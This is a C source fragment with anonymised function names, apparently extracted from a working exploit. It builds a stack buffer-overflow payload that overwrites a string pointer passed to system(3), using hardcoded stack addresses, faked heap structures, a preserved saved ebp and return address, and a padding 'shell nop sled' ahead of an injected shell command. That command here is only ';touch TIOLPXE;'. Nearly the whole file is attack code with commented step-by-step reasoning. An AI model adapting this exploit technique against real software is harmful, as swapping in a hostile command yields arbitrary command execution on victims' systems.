#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int MAX_IV ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,int) ; 
 int FUNC1 (char*) ; 

int
FUNC2(char *result_set, char *criteria){
  char iv[MAX_IV];
  char *index = "iiii";
  char *size = "ssss";
  char doublenull[] = {0x00, 0x00};
  char *s;
  char *end;
  char *tmp;
  int i;

  s = iv;
  /* we need 10736 - 4 bytes to overflow the ip */
  end = s + 10736 - 8; /* -8 because we want ot preserve the saved ebp */

  /* let's build the injection vector */
  /* if will be stored in the filename array, &filename 0xbfbfbcb0 */

  /* 0xbfbfbcb0 */
  /* marker */
  tmp = "AAAABBBBCCCCDDDD";
  while(*tmp) *s++ = *tmp++;

  /*
   * simutale the rc and r structures on the stack - to prevent
   * segmentation faults in g_snprintf() and strcpy()
   */  

  /* 0xbfbfbcc0 - begining of the of the rc structure */
  /* pointer to results_set strucure, but points to itself */
  *s++ = 0xc0;
  *s++ = 0xbc; 
  *s++ = 0xbf;
  *s++ = 0xbf;    
  /* 0xbfbfbcc4 - anything */
  *s++ = 0x01;
  *s++ = 0x01;
  *s++ = 0x01;
  *s++ = 0x01;
  /* 0xbfbfbcc8 - anything */
  *s++ = 0x01;
  *s++ = 0x01;
  *s++ = 0x01;
  *s++ = 0x01;
  /* 0xbfbfbccc - begining of the r structure and rc cont'd */
  /* can be anything */
  *s++ = 0x01;
  *s++ = 0x01;
  *s++ = 0x01;
  *s++ = 0x01;
  /* 0xbfbfbcd0 - a string that is actually used, point to "" */
  /* it just do happens that 0xbfbfe6ac has 0x00000000 */
  *s++ = 0xac;
  *s++ = 0xe6;
  *s++ = 0xbf;
  *s++ = 0xbf;

  /* the payload: simply the shell commands. Note: the '\n' at */
  /* is required, otherwise sh complains and fails us.         */
  tmp = ";touch TIOLPXE;\n";

  /* want to put it as close to the $ebp as possible */
  /* shell "nop sled" */ 
  while(end - s > FUNC1(tmp)) *s++ = '.';
  
  /* now output the payload */
  while(*(tmp)) *(s++) = *(tmp++);
  
  /* preserv saved ebp (0xbfbfe6b8), so we can have clean return? */
  *s++ = 0xb8;
  *s++ = 0xe6;
  *s++ = 0xbf;
  *s++ = 0xbf;

  /* smasher - no need to smash the ret address, preserve it */
  *s++ = 0x39;
  *s++ = 0x2d;
  *s++ = 0x08;
  *s++ = 0x08;

  /*
   * Need to preserve following function call arguments to survive until
   * return from the function: rc, r, string. 
   */

  /* rc
   * rc is allocated on the heap and its address varies from execution
   * to execution. Let's just point it to an address on the stack that
   * we control.
   * 0xbfbfbc0
   */
  *s++ = 0xc0;
  *s++ = 0xbc;
  *s++ = 0xbf;
  *s++ = 0xbf;

  /* r
   * r's address doesn't change and it's 0x8102a00 - can't send it though,
   * because of the 0x00 byte. Let us use a stack location then. (Note
   * that we could probably use the strcpy() to write that 0x00 byte).
   * 0xbfbfbccc
   */
  *s++ = 0xcc;
  *s++ = 0xbc;
  *s++ = 0xbf;
  *s++ = 0xbf;
  
  /* string
   * string (with some other strings concatenated) will be passed
   * to the system(3) call. Let us then point to the stack, where we
   * can easily store a shell command of out choice.
   * 0xbfbfe628
   */  
  *s++ = 0x28;
  *s++ = 0xe6;
  *s++ = 0xbf;
  *s++ = 0xbf;
  
  /* null-terminate for the strlen() below  to work */
  *s = 0x00;

  /* we have all the parts, build the result set */
  FUNC0(&result_set[0], index, 4);
  FUNC0(&result_set[4], size, 4);
  FUNC0(&result_set[8], iv, FUNC1(iv));
  FUNC0(&result_set[8 + FUNC1(iv)], doublenull, 2);

  return 4 + 4 + FUNC1(iv) + 2;
}